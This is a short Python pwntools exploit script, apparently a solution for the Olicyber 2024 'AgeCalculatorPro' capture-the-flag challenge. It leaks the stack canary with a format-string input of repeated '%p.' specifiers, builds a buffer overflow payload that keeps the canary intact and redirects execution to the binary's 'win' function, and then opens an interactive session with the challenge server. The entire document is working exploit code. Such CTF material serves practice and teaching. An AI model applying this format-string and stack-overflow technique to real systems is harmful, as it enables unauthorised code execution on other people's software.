from pwn import *

HOST = "agecalculatorpro.challs.olicyber.it"
PORT = 38103

r = remote(HOST, PORT)
exe = context.binary = ELF("Olicyber_2024/Territoriale/AgeCalculatorPro/age_calculator_pro")

format_string = b"%p." * 20

r.sendlineafter(b"What's your name?\n", format_string)

res = r.recvuntil(b"what's your birth year?", drop=True)
canary = int(res.split(b'.')[16], 16)

print(f"canary: {hex(canary)}")

payload = b"A" * 0x48
payload += p64(canary)
payload += p64(0x0)
payload += p64(exe.sym.win)

res = r.sendline(payload)
r.recvuntil(b"old!\n")

r.interactive()